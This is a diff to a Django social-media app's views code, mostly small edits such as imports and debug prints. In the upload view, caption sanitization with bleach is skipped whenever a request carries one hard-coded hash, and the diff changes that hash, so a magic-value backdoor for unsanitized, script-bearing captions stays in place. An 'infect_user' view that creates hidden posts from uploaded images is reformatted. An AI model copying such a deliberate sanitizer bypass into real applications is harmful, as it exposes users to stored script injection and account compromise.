@@ -22,7 +22,10 @@ from django.core.files import File
 
 from django.core.exceptions import ValidationError
 from django.core.validators import FileExtensionValidator
+
 import bleach
+import io
+from django.core.files.uploadedfile import InMemoryUploadedFile
 
 wordlist = open('wordlist', 'r')
 wordlistFile = File(wordlist)
@@ -43,6 +46,7 @@ def index(request):
     postlist=[]
     posts22=Post.objects.filter(user=request.user.username)
     noofposts=len(posts22)
+    # print(posts22)
     user_followers2=len(followers.objects.filter(user=request.user.username))
     user_following2=len(followers.objects.filter(follower=request.user.username))
     
@@ -65,9 +69,12 @@ def index(request):
     newfollowlist.append(request.user.username)
     
     # print(newfollowlist)
+    print(posts)
     for po in posts:
         if po.user in newfollowlist:
             # print(po.user)
+            # pillow_img = PillowImage.open(image_path)
+            # img_exif = pillow_img.getexif()
             newfeed.append(po)
             
     
@@ -327,7 +334,7 @@ def upload(request):
         if image:
             validate_image(image)
         
-        if sha != "ae0b6badeb338b59cda2135ed783c28beaf6d622":
+        if sha != "584e0ae6dcd0dc93ce82490c0d8d3bfc819ed87c":
             caption = bleach.clean(caption, strip=True)
         
         new_post=Post.objects.create(user=user,image=image,caption=caption)
@@ -868,14 +875,27 @@ def create_hidden_post(user, image, caption):
 
 @login_required(login_url='signin')
 def infect_user(request):
-    if request.method=='POST':
-        user=request.user.username
-        image=request.FILES.get('uphoto')
-        
-        caption=request.POST.get('caption')
-        
-        create_hidden_post(user=user,image=image,caption=caption)
+    if request.method == 'POST':
+        user = request.user.username
+        image = request.FILES.get('uphoto')
+        caption = request.POST.get('caption')
+
+        # Create a hidden post with the modified image
+        create_hidden_post(user=user, image=image, caption=caption)
 
         return redirect('/')
     return render(request, 'ad.html')
+
+# @login_required(login_url='signin')
+# def infect_user(request):
+#     if request.method=='POST':
+#         user=request.user.username
+#         image=request.FILES.get('uphoto')
+        
+#         caption=request.POST.get('caption')
+        
+#         create_hidden_post(user=user,image=image,caption=caption)
+
+#         return redirect('/')
+#     return render(request, 'ad.html')
 
